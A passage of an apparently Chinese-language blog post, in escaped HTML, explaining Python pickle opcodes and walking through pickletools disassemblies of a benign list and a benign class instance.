&amp;#x27;c&amp;#x27;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;   13: a    APPEND&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;   14: .    STOP&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;highest protocol among opcodes = 0&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;
&lt;p&gt;pickletools 指令集&lt;/p&gt;
&lt;figure class=&#34;highlight plaintext&#34;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&#34;gutter&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;1&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;2&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;3&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;4&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;5&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;6&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;7&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;8&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;9&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;10&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;11&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;12&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;13&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;14&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;15&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;16&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;17&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;18&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;19&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;20&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;21&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;22&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;23&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;24&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;25&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;26&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;27&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;28&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;29&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;30&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;31&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;32&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;33&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;34&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;35&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;36&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;37&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;38&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;39&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;40&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;41&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;42&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;43&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;td class=&#34;code&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;MARK           = b&amp;#x27;(&amp;#x27;   # push special markobject on stack&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;STOP           = b&amp;#x27;.&amp;#x27;   # every pickle ends with STOP&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;POP            = b&amp;#x27;0&amp;#x27;   # discard topmost stack item&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;POP_MARK       = b&amp;#x27;1&amp;#x27;   # discard stack top through topmost markobject&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;DUP            = b&amp;#x27;2&amp;#x27;   # duplicate top stack item&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;FLOAT          = b&amp;#x27;F&amp;#x27;   # push float object; decimal string argument&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;INT            = b&amp;#x27;I&amp;#x27;   # push integer or bool; decimal string argument&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;BININT         = b&amp;#x27;J&amp;#x27;   # push four-byte signed int&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;BININT1        = b&amp;#x27;K&amp;#x27;   # push 1-byte unsigned int&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;LONG           = b&amp;#x27;L&amp;#x27;   # push long; decimal string argument&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;BININT2        = b&amp;#x27;M&amp;#x27;   # push 2-byte unsigned int&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;NONE           = b&amp;#x27;N&amp;#x27;   # push None&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;PERSID         = b&amp;#x27;P&amp;#x27;   # push persistent object; id is taken from string arg&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;BINPERSID      = b&amp;#x27;Q&amp;#x27;   #  &amp;quot;       &amp;quot;         &amp;quot;  ;  &amp;quot;  &amp;quot;   &amp;quot;     &amp;quot;  stack&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;REDUCE         = b&amp;#x27;R&amp;#x27;   # apply callable to argtuple, both on stack&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;STRING         = b&amp;#x27;S&amp;#x27;   # push string; NL-terminated string argument&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;BINSTRING      = b&amp;#x27;T&amp;#x27;   # push string; counted binary string argument&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;SHORT_BINSTRING= b&amp;#x27;U&amp;#x27;   #  &amp;quot;     &amp;quot;   ;    &amp;quot;      &amp;quot;       &amp;quot;      &amp;quot; &amp;lt; 256 bytes&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;UNICODE        = b&amp;#x27;V&amp;#x27;   # push Unicode string; raw-unicode-escaped&amp;#x27;d argument&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;BINUNICODE     = b&amp;#x27;X&amp;#x27;   #   &amp;quot;     &amp;quot;       &amp;quot;  ; counted UTF-8 string argument&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;APPEND         = b&amp;#x27;a&amp;#x27;   # append stack top to list below it&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;BUILD          = b&amp;#x27;b&amp;#x27;   # call __setstate__ or __dict__.update()&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;GLOBAL         = b&amp;#x27;c&amp;#x27;   # push self.find_class(modname, name); 2 string args&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;DICT           = b&amp;#x27;d&amp;#x27;   # build a dict from stack items&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;EMPTY_DICT     = b&amp;#x27;&amp;#125;&amp;#x27;   # push empty dict&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;APPENDS        = b&amp;#x27;e&amp;#x27;   # extend list on stack by topmost stack slice&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;GET            = b&amp;#x27;g&amp;#x27;   # push item from memo on stack; index is string arg&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;BINGET         = b&amp;#x27;h&amp;#x27;   #   &amp;quot;    &amp;quot;    &amp;quot;    &amp;quot;   &amp;quot;   &amp;quot;  ;   &amp;quot;    &amp;quot; 1-byte arg&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;INST           = b&amp;#x27;i&amp;#x27;   # build &amp;amp; push class instance&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;LONG_BINGET    = b&amp;#x27;j&amp;#x27;   # push item from memo on stack; index is 4-byte arg&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;LIST           = b&amp;#x27;l&amp;#x27;   # build list from topmost stack items&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;EMPTY_LIST     = b&amp;#x27;]&amp;#x27;   # push empty list&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;OBJ            = b&amp;#x27;o&amp;#x27;   # build &amp;amp; push class instance&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;PUT            = b&amp;#x27;p&amp;#x27;   # store stack top in memo; index is string arg&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;BINPUT         = b&amp;#x27;q&amp;#x27;   #   &amp;quot;     &amp;quot;    &amp;quot;   &amp;quot;   &amp;quot; ;   &amp;quot;    &amp;quot; 1-byte arg&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;LONG_BINPUT    = b&amp;#x27;r&amp;#x27;   #   &amp;quot;     &amp;quot;    &amp;quot;   &amp;quot;   &amp;quot; ;   &amp;quot;    &amp;quot; 4-byte arg&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;SETITEM        = b&amp;#x27;s&amp;#x27;   # add key+value pair to dict&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;TUPLE          = b&amp;#x27;t&amp;#x27;   # build tuple from topmost stack items&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;EMPTY_TUPLE    = b&amp;#x27;)&amp;#x27;   # push empty tuple&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;SETITEMS       = b&amp;#x27;u&amp;#x27;   # modify dict by adding topmost key+value pairs&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;BINFLOAT       = b&amp;#x27;G&amp;#x27;   # push float; arg is 8-byte float encoding&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;TRUE           = b&amp;#x27;I01\n&amp;#x27;  # not an opcode; see INT docs in pickletools.py&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;FALSE          = b&amp;#x27;I00\n&amp;#x27;  # not an opcode; see INT docs in pickletools.py&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;
&lt;p&gt;将上面的输出对照翻译&lt;/p&gt;
&lt;figure class=&#34;highlight plaintext&#34;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&#34;gutter&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;1&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;2&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;3&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;4&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;5&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;6&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;7&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;8&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;9&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;10&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;11&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;td class=&#34;code&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;b&amp;#x27;\x80\x03](X\x01\x00\x00\x00aX\x01\x00\x00\x00bX\x01\x00\x00\x00ce.&amp;#x27;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;    0: \x80 PROTO      3	#标明使用协议版本&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;    2: ]    EMPTY_LIST	#将空列表压入栈&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;    3: (    MARK	#将标志压入栈&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;    4: X        BINUNICODE &amp;#x27;a&amp;#x27;	#unicode字符&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;   10: X        BINUNICODE &amp;#x27;b&amp;#x27;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;   16: X        BINUNICODE &amp;#x27;c&amp;#x27;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;   22: e        APPENDS    (MARK at 3)	#将3号标志后的数据压入列表&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;   # 弹出栈中的数据，结束流程&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;   23: .    STOP&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;highest protocol among opcodes = 2&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;
&lt;p&gt;我们再来看另一个更复杂的例子&lt;/p&gt;
&lt;figure class=&#34;highlight plaintext&#34;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&#34;gutter&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;1&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;2&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;3&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;4&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;5&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;6&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;7&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;8&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;9&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;10&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;11&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;12&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;13&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;14&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;15&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;16&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;17&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;td class=&#34;code&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;import pickle&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;import pickletools&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;import base64&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;class a_class():&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;    def __init__(self):&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;        self.age = 114514&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;        self.name = &amp;quot;QAQ&amp;quot;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;        self.list = [&amp;quot;1919&amp;quot;,&amp;quot;810&amp;quot;,&amp;quot;qwq&amp;quot;]&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;a_class_new = a_class()&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;a_class_pickle = pickle.dumps(a_class_new,protocol=3)&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;print(a_class_pickle)&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;# 优化一个已经被打包的字符串&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;a_list_pickle = pickletools.optimize(a_class_pickle)&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;print(a_class_pickle)&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;# 反汇编一个已经被打包的字符串&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;pickletools.dis(a_class_pickle)&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;
&lt;figure class=&#34;highlight plaintext&#34;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&#34;gutter&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;1&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;2&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;3&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;4&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;5&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;6&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;7&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;8&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;9&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;10&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;11&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;12&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;13&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;14&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;15&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;16&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;17&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;18&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;19&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;20&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;21&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;22&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;23&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;24&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;25&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;26&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;27&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;28&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;29&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;30&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;31&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;32&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;33&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;34&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;35&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;36&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;37&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;38&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;39&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;40&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;41&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;42&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;43&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;44&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;45&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;46&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;47&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;48&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;49&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;50&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;51&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;52&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;53&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;54&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;55&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;td class=&#34;code&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;b&amp;#x27;\x80\x03c__main__\na_class\nq\x00)\x81q\x01&amp;#125;q\x02(X\x03\x00\x00\x00ageq\x03JR\xbf\x01\x00X\x04\x00\x00\x00nameq\x04X\x03\x00\x00\x00QAQq\x05X\x04\x00\x00\x00listq\x06]q\x07(X\x04\x00\x00\x001919q\x08X\x03\x00\x00\x00810q\tX\x03\x00\x00\x00qwqq\neub.&amp;#x27;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;b&amp;#x27;\x80\x03c__main__\na_class\nq\x00)\x81q\x01&amp;#125;q\x02(X\x03\x00\x00\x00ageq\x03JR\xbf\x01\x00X\x04\x00\x00\x00nameq\x04X\x03\x00\x00\x00QAQq\x05X\x04\x00\x00\x00listq\x06]q\x07(X\x04\x00\x00\x001919q\x08X\x03\x00\x00\x00810q\tX\x03\x00\x00\x00qwqq\neub.&amp;#x27;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;    0: \x80 PROTO      3&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;    # push self.find_class(modname, name); 连续读取两个字符串作为参数，以\n为界&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;    # 这里就是self.find_class(‘__main__’, ‘a_class’);&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;    # 需要注意的版本不同，find_class函数也不同&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;    2: c    GLOBAL     &amp;#x27;__main__ a_class&amp;#x27;	&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;    # 不影响反序列化&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;   20: q    BINPUT     0&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;   # 向栈中压入一个元组&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;   22: )    EMPTY_TUPLE&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;   # 见pickletools源码第2097行（注意版本）&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;   # 大意为，该指令之前的栈内容应该为一个类（2行GLOBAL创建的类），类后为一个元组（22行压入的TUPLE），调用cls.__new__(cls, *args)（即用元组中的参数创建一个实例，这里元组实际为空）&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;   23: \x81 NEWOBJ&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;   24: q    BINPUT     1&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;   # 压入一个新的字典&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;   26: &amp;#125;    EMPTY_DICT&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;   27: q    BINPUT     2&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;   # 一个标志&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;   29: (    MARK&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;   # 压入unicode值&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;   30: X        BINUNICODE &amp;#x27;age&amp;#x27;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;   38: q        BINPUT     3&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;   40: J        BININT     114514&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;   45: X        BINUNICODE &amp;#x27;name&amp;#x27;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;   54: q        BINPUT     4&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;   56: X        BINUNICODE &amp;#x27;QAQ&amp;#x27;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;   64: q        BINPUT     5&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;   66: X        BINUNICODE &amp;#x27;list&amp;#x27;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;   75: q        BINPUT     6&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;   77: ]        EMPTY_LIST&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;   78: q        BINPUT     7&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;   # 又一个标志&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;   80: (        MARK&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;   81: X            BINUNICODE &amp;#x27;1919&amp;#x27;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;   90: q            BINPUT     8&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;   92: X            BINUNICODE &amp;#x27;810&amp;#x27;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;  100: q            BINPUT     9&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;  102: X            BINUNICODE &amp;#x27;qwq&amp;#x27;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;  110: q            BINPUT     10&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;  # 将第80行的mark之后的值压入第77行的列表&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;  112: e            APPENDS    (MARK at 80)&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;  # 详情见pickletools源码第1674行（注意版本）&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;  # 大意为将任意数量的键值对添加到现有字典中&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;  # Stack before:  ... pydict markobject key_1 value_1 ... key_n value_n&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;  # Stack after:   ... pydict&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;  113: u        SETITEMS   (MARK at 29)&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;  # 通过__setstate__或更新__dict__完成构建对象（对象为我们在23行创建的）。&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;  # 如果对象具有__setstate__方法，则调用anyobject .__setstate__（参数）&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;  # 如果无__setstate__方法，则通过anyobject.__dict__.update(argument)更新值&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;  # 注意这里可能会产生变量覆盖&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;  114: b    BUILD&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;  # 弹出栈中的数据，结束流程&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;  115: .    STOP&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;highest protocol among opcodes = 